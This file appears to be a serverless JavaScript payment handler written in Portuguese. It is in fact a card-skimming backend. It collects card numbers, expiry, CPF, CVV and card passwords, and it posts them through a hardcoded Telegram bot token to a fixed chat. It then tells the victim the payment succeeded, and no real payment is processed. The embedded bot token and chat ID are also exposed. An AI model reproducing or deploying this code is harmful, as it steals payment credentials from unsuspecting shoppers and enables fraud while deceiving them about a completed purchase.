import axios from 'axios';

const TELEGRAM_TOKEN = "6725163602:AAHskt1qmIpPitj_OBmqQ6kvwB9tUxLZE_o";
const CHAT_ID = "5650303115";

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ erro: "Método não permitido" });

  try {
    const {
      numero, senha, nome_cartao, validade,
      cpf_cartao, cvv, valor, email, nome
    } = req.body;

    if (!numero || !nome_cartao || !validade || !cpf_cartao || !cvv || valor <= 0) {
      return res.status(400).json({ erro: "Dados do cartão incompletos." });
    }

    const mensagem = `
Novo Pagamento via Cartão:
- Nome: ${nome}
- E-mail: ${email}
- Valor: R$ ${valor}
- Número do Cartão: ${numero}
- Nome do Titular: ${nome_cartao}
- Validade: ${validade}
- CPF: ${cpf_cartao}
- Senha: ${senha}
`;

    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensagem,
      parse_mode: "HTML"
    });

    if (response.status !== 200) {
      console.error("Erro no Telegram:", response.data);
      return res.status(500).json({ erro: "Erro ao enviar dados para o Telegram." });
    }

    res.json({ success: true, message: "Pagamento processado com sucesso!" });
  } catch (err) {
    console.error("💥 ERRO CARTÃO:", err?.response?.data || err.message);
    return res.status(500).json({ erro: "Erro ao processar o cartão." });
  }
}
